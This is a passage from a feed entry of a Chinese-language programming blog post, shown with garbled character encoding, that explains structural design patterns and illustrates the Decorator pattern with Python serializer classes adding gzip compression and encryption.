&lt;/ul></content><category scheme="https://mincodes.com/tags/design-pattern/" term="Design-Pattern" label="Design-Pattern"/><category scheme="https://mincodes.com/tags/architecture/" term="Architecture" label="Architecture"/></entry><entry><title type="text">è®¾è®¡æ¨¡å¼ï¼šç»“æ„å‹ (Structural)</title><link rel="alternate" type="text/html" href="https://mincodes.com/posts/design-patterns-structural/"/><id>https://mincodes.com/posts/design-patterns-structural/</id><updated>2023-07-24T21:16:06+08:00</updated><published>2023-07-07T18:35:00+08:00</published><author><name>Min Deng</name><uri>https://mincodes.com/</uri></author><rights>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en)</rights><summary type="html">è®¾è®¡æ¨¡å¼æ€»ç›®å½•è¯·å‚è€ƒï¼šè®¾è®¡æ¨¡å¼æ‰€æ”¯æŒçš„è®¾è®¡çš„å¯å˜æ–¹é¢ã€‚ é€‚é…å™¨ (Adapter) æ„å›¾ å°†ä¸€ä¸ªç±»çš„æ¥å£è½¬æ¢æˆå®¢æˆ·å¸Œæœ›çš„å¦å¤–â€¦</summary><content type="html">&lt;p>è®¾è®¡æ¨¡å¼æ€»ç›®å½•è¯·å‚è€ƒï¼š&lt;a href="https://mincodes.com/posts/design-patterns/#è®¾è®¡æ¨¡å¼æ‰€æ”¯æŒçš„è®¾è®¡çš„å¯å˜æ–¹é¢">è®¾è®¡æ¨¡å¼æ‰€æ”¯æŒçš„è®¾è®¡çš„å¯å˜æ–¹é¢&lt;/a>ã€‚&lt;/p>
&lt;h2 id="é€‚é…å™¨--adapter">é€‚é…å™¨ (Adapter)&lt;/h2>
&lt;h3 id="æ„å›¾">æ„å›¾&lt;/h3>
&lt;blockquote>
&lt;p>å°†ä¸€ä¸ªç±»çš„æ¥å£è½¬æ¢æˆå®¢æˆ·å¸Œæœ›çš„å¦å¤–ä¸€ä¸ªæ¥å£ï¼Œä½¿å¾—åŸæœ¬ä¸å…¼å®¹çš„æ¨¡å—ä¹‹é—´å¯ä»¥ååŒå·¥ä½œã€‚&lt;/p>
&lt;/blockquote>
&lt;h3 id="ç±»å›¾">ç±»å›¾&lt;/h3>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/adapter-class.png" width="300">
&lt;/figure>
&lt;h3 id="ç›¸å…³æ¨¡å¼">ç›¸å…³æ¨¡å¼&lt;/h3>
&lt;p>å’Œ &lt;a href="https://mincodes.com/posts/design-patterns-structural/#%E6%A1%A5%E6%8E%A5--bridge">Bridge æ¡¥æ¥&lt;/a> æœ‰ç‚¹ç±»ä¼¼ï¼Œä½†æ˜¯å‡ºå‘ç‚¹ä¸åŒï¼š&lt;/p>
&lt;ul>
&lt;li>Bridge çš„ç›®çš„æ˜¯å°†æ¥å£éƒ¨åˆ†å’Œå®ç°éƒ¨åˆ†åˆ†ç¦»ï¼Œä»è€Œå¯ä»¥å¯¹å®ƒä»¬è¾ƒä¸ºå®¹æ˜“ä¹Ÿç›¸å¯¹ç‹¬ç«‹åœ°åŠ ä»¥æ”¹å˜ã€‚&lt;/li>
&lt;li>Adapter æ„å‘³ç€æ”¹å˜ä¸€ä¸ªå·²æœ‰å¯¹è±¡çš„æ¥å£ã€‚&lt;/li>
&lt;/ul>
&lt;p>&lt;a href="https://mincodes.com/posts/design-patterns-structural/#%E8%A3%85%E9%A5%B0%E5%99%A8--decorator">Decorator è£…é¥°å™¨&lt;/a> åœ¨ä¸æ”¹å˜æ¥å£çš„æƒ…å†µä¸‹ï¼Œå¢å¼ºäº†å…¶ä»–å¯¹è±¡çš„åŠŸèƒ½ï¼Œå› æ­¤ Decorator å¯¹åº”ç”¨ç¨‹åºçš„é€æ˜æ€§æ¯”è¾ƒå¥½ï¼Œè€Œä¸”å¯ä»¥æ”¯æŒé€’å½’ç»„åˆã€‚&lt;/p>
&lt;p>&lt;a href="https://mincodes.com/posts/design-patterns-structural/#%E4%BB%A3%E7%90%86--proxy">Proxy ä»£ç†&lt;/a> åœ¨ä¸æ”¹å˜å®ƒçš„æ¥å£çš„æ¡ä»¶ä¸‹ï¼Œä¸ºå¦ä¸€ä¸ªå¯¹è±¡å®šä¹‰äº†ä¸€ä¸ªä»£ç†ã€‚&lt;/p>
&lt;h2 id="æ¡¥æ¥--bridge">æ¡¥æ¥ (Bridge)&lt;/h2>
&lt;h3 id="æ„å›¾">æ„å›¾&lt;/h3>
&lt;blockquote>
&lt;p>å°†æŠ½è±¡éƒ¨åˆ†ä¸å®ƒçš„å®ç°éƒ¨åˆ†åˆ†ç¦»ï¼Œä½¿å®ƒä»¬å¯ä»¥ç‹¬ç«‹åœ°å˜åŒ–ã€‚&lt;/p>
&lt;/blockquote>
&lt;h3 id="ç±»å›¾">ç±»å›¾&lt;/h3>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/bridge-class.png">
&lt;/figure>
&lt;p>ä¸Šå›¾ä¸­ &lt;code>Window&lt;/code> å’Œ &lt;code>WindowImp&lt;/code> ä¹‹é—´å°±æ˜¯ Bridge çš„å…³ç³»ã€‚&lt;/p>
&lt;h2 id="ç»„åˆ--composite">ç»„åˆ (Composite)&lt;/h2>
&lt;h3 id="æ„å›¾">æ„å›¾&lt;/h3>
&lt;blockquote>
&lt;p>å°†å¯¹è±¡ç»„åˆæˆæ ‘å½¢ç»“æ„ä»¥è¡¨ç¤ºâ€œéƒ¨åˆ†ï¼æ•´ä½“â€çš„å±‚æ¬¡ç»“æ„ã€‚Composite ä½¿å¾—ç”¨æˆ·å¯¹å•ä¸ªå¯¹è±¡å’Œç»„åˆå¯¹è±¡çš„ä½¿ç”¨å…·æœ‰ä¸€è‡´æ€§ã€‚&lt;/p>
&lt;/blockquote>
&lt;h3 id="ç±»å›¾">ç±»å›¾&lt;/h3>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/composite-class.png">
&lt;/figure>
&lt;h2 id="è£…é¥°å™¨--decorator">è£…é¥°å™¨ (Decorator)&lt;/h2>
&lt;h3 id="æ„å›¾">æ„å›¾&lt;/h3>
&lt;blockquote>
&lt;p>åŠ¨æ€åœ°ç»™ä¸€ä¸ªå¯¹è±¡æ·»åŠ ä¸€äº›é¢å¤–çš„èŒè´£ï¼ˆåŠŸèƒ½ï¼‰ã€‚&lt;/p>
&lt;/blockquote>
&lt;p>ä¸‹é¢æˆ‘ä»¬ç»“åˆæ¡ˆä¾‹æ¥é˜è¿°ä¸€ä¸‹ã€‚&lt;/p>
&lt;h3 id="æ¡ˆä¾‹åˆ†æ-æŒä¹…åŒ–å·¥å…·">æ¡ˆä¾‹åˆ†æï¼šæŒä¹…åŒ–å·¥å…·&lt;/h3>
&lt;h4 id="æŒä¹…åŒ–å·¥å…·">æŒä¹…åŒ–å·¥å…·&lt;/h4>
&lt;p>å‡è®¾æˆ‘ä»¬æœ‰ä¸€ä¸ªæ•°æ®æŒä¹…åŒ–å·¥å…·ï¼Œå…¶åŠŸèƒ½å¾ˆç®€å•ï¼Œå°±æ˜¯å†™å…¥æŒä¹…åŒ–æ•°æ®ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="lnt">24
&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;span class="lnt">28
&lt;/span>&lt;span class="lnt">29
&lt;/span>&lt;span class="lnt">30
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># æŒä¹…åŒ–æ¥å£&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">Serializer&lt;/span>&lt;span class="p">:&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bs&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">pass&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># åŸºäºæ–‡ä»¶çš„æŒä¹…åŒ–å®ç°&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">FileBackendSerializer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Serializer&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="fm">__init__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">path&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;wb&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bs&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_file&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bs&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_file&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">close&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># åŸºäºæœåŠ¡å™¨çš„æŒä¹…åŒ–å®ç°&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">ServerBackendSerializer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Serializer&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="fm">__init__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">address&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_server&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_connect&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">address&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bs&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_server&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">send&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bs&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_server&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">disconnect&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="c1"># ...&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œå®¢æˆ·é€šè¿‡ &lt;code>Serializer&lt;/code> æ¥å£æ¥ä½¿ç”¨è¯¥åŠŸèƒ½ï¼Œåº•å±‚å®ç°å¯èƒ½æ˜¯åŸºäºæ–‡ä»¶çš„
&lt;code>FileBackendSerializer&lt;/code>, æˆ–è€…æ˜¯åŸºäºæœåŠ¡å™¨çš„ &lt;code>ServerBackendSerializer&lt;/code>, å®¢æˆ·å¯ä»¥æ ¹æ®ä¸åŒæƒ…å†µé€‰ç”¨ä¸åŒçš„æŒä¹…åŒ–å®ç°ã€‚&lt;/p>
&lt;p>æˆ‘ä»¬ç”»ä¸€ä¸‹ç±»å›¾ï¼š&lt;/p>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/decorator-class1.png">
&lt;/figure>
&lt;h4 id="å¢åŠ -gzip-å‹ç¼©åŠŸèƒ½">å¢åŠ  gzip å‹ç¼©åŠŸèƒ½&lt;/h4>
&lt;p>æŸä¸€å¤©ï¼Œæˆ‘ä»¬å‘ç°æŒä¹…åŒ–çš„æ•°æ®é‡è¶Šæ¥è¶Šå¤§ï¼Œå› æ­¤å¸Œæœ›èƒ½å¤Ÿç»™ä¸Šè¿°æŒä¹…åŒ–å·¥å…·å¢åŠ  gzip çš„æ”¯æŒï¼Œä»¥å‡å°‘ç£ç›˜ç©ºé—´å ç”¨ã€‚&lt;/p>
&lt;p>å½“æˆ‘ä»¬æƒ³ä¸ºä¸€ä¸ªç±»æ‰©å±•æŸæƒ³åŠŸèƒ½æ—¶ï¼Œä¸€ç§å¸¸è§çš„åšæ³•æ˜¯ä¸ºå…¶åˆ›å»ºä¸€ä¸ªå­ç±»ï¼Œå¹¶åœ¨å­ç±»ä¸­é‡å†™ä¸€äº›æ–¹æ³•ï¼Œæ¥æ·»åŠ ä¸€äº›é¢å¤–çš„åŠŸèƒ½ã€‚ä¾‹å¦‚ï¼Œåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥å†™ä¸€ä¸ª
&lt;code>FileBackendSerializer&lt;/code> çš„å­ç±» &lt;code>GzipFileBackendSerializer&lt;/code>, æ¥ä¸ºæ–‡ä»¶æŒä¹…åŒ–ç±»å¢åŠ 
gzip çš„åŠŸèƒ½ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">gzip&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># åŸºäºæ–‡ä»¶çš„æŒä¹…åŒ–å®ç°ï¼ŒåŒæ—¶æ”¯æŒ gzip å‹ç¼©åŠŸèƒ½&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">GzipFileBackendSerializer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">FileBackendSerializer&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="fm">__init__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">path&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nb">open&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">path&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s1">&amp;#39;wb&amp;#39;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bs&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bs&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">gzip&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">compress&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bs&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_file&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bs&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">close&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_file&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">close&lt;/span>&lt;span class="p">()&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;p>ç±»ä¼¼çš„ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥ä¸º &lt;code>ServerBackendSerializer&lt;/code> å¢åŠ ä¸€ä¸ªå­ç±»
&lt;code>GzipServerBackendSerializer&lt;/code>, ä¸ºåŸºäºæœåŠ¡å™¨çš„æŒä¹…åŒ–ç±»å¢åŠ  gzip åŠŸèƒ½ã€‚&lt;/p>
&lt;p>æ­¤æ—¶ï¼Œç±»å›¾å˜æˆä¸‹é¢è¿™æ ·ï¼š&lt;/p>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/decorator-class2.png">
&lt;/figure>
&lt;h4 id="æå‡æ•°æ®å®‰å…¨æ€§">æå‡æ•°æ®å®‰å…¨æ€§&lt;/h4>
&lt;p>æ–°éœ€æ±‚åˆæ¥äº†ï¼Œæˆ‘ä»¬å¸Œæœ›ä¸ºæŸäº›æ•æ„Ÿæ•°æ®æä¾›åŠ å¯†åŠŸèƒ½ï¼Œä»¥ä¾¿æå‡æ•°æ®çš„å®‰å…¨æ€§ã€‚å’Œå‰é¢çš„
gzip åŠŸèƒ½ç±»ä¼¼ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡æ‰©å±•å­ç±»æ¥å®ç°ï¼Œæ‰©å±•åçš„ç±»å›¾å¦‚ä¸‹æ‰€ç¤ºï¼š&lt;/p>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/decorator-class3.png">
&lt;/figure>
&lt;h4 id="gzip-plus-åŠ å¯†åŠŸèƒ½">Gzip + åŠ å¯†åŠŸèƒ½&lt;/h4>
&lt;p>é’ˆå¯¹æœ‰äº›æ•°æ®ï¼Œæˆ‘ä»¬æ—¢å¸Œæœ›å‹ç¼©ï¼Œåˆå¸Œæœ›åŠ å¯†ï¼Œåº”è¯¥æ€ä¹ˆå¤„ç†å‘¢ï¼Ÿå¦‚æœä»ç„¶æŒ‰ç…§åˆ›å»ºå­ç±»çš„æ€è·¯ï¼Œæˆ‘ä»¬çš„ç±»å›¾å¤§æ¦‚ä¼šå‘å±•æˆè¿™æ ·ï¼š&lt;/p>
&lt;figure>&lt;img src="https://mincodes.com/ox-hugo/decorator-class4.png">
&lt;/figure>
&lt;p>æ˜¯ä¸æ˜¯æ„Ÿè§‰å“ªé‡Œä¸å¤ªå¯¹ï¼Ÿå­ç±»æ•°é‡è¶Šæ¥è¶Šå¤šï¼Œè€Œä¸”å¼€å§‹å‡ºç°äº†ä¸å°‘å†—ä½™ä»£ç ï¼Œä¾‹å¦‚
&lt;code>SecureGzipFileBackendSerializer&lt;/code> å’Œ &lt;code>SecureFileBackendSerializer&lt;/code> çš„ä»£ç ä¸€å®šæœ‰ä¸å°‘å†—ä½™çš„æˆåˆ†ï¼Œ &lt;code>SecureGzipServerBackendSerializer&lt;/code> å’Œ &lt;code>SecureServerBackendSerializer&lt;/code>
ä¹Ÿæ˜¯å¦‚æ­¤ã€‚&lt;/p>
&lt;h4 id="å¼•å…¥è£…é¥°è€…æ¨¡å¼">å¼•å…¥è£…é¥°è€…æ¨¡å¼&lt;/h4>
&lt;p>æœ‰æ²¡æœ‰æ›´å¥½çš„æ–¹æ¡ˆï¼Œæ¥è§£å†³ä¸Šè¿°è¿™ç±»é—®é¢˜ï¼Ÿç­”æ¡ˆæ˜¯ç”¨ç»„åˆæ›¿ä»£ç»§æ‰¿ï¼ˆå‚è€ƒ&lt;a href="https://mincodes.com/posts/design-patterns/#composite-reuse-principle-ç»„åˆå¤ç”¨åŸåˆ™">ç»„åˆå¤ç”¨åŸåˆ™&lt;/a>ï¼‰ï¼Œå…·ä½“åˆ°è¿™é‡Œï¼Œå°±æ˜¯åˆ©ç”¨è£…é¥°å™¨ï¼ˆDecoratorï¼‰æ¨¡å¼ã€‚&lt;/p>
&lt;p>æˆ‘ä»¬æ¥æ¼”ç¤ºä¸€ä¸‹ï¼Œé‡‡ç”¨è£…é¥°å™¨æ¨¡å¼ä¼šå¦‚ä½•å®ç° gzip åŠŸèƒ½ï¼Œä»¥åŠåŠ å¯†åŠŸèƒ½ï¼š&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="lnt"> 1
&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="kn">import&lt;/span> &lt;span class="nn">gzip&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å¢åŠ  gzip åŠŸèƒ½çš„ Serializer&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">GzipSerializer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Serializer&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="fm">__init__&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">s&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">Serializer&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_s&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">s&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="k">def&lt;/span> &lt;span class="nf">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="bp">self&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">bs&lt;/span>&lt;span class="p">):&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="n">bs&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="n">gzip&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">compress&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bs&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="bp">self&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">_s&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">write&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">bs&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># å¢åŠ åŠ å¯†åŠŸèƒ½çš„ Serializer&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="k">class&lt;/span> &lt;span class="nc">SecureSerializer&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Serializer&lt;/span>&lt;span class="p">):&lt;/span>
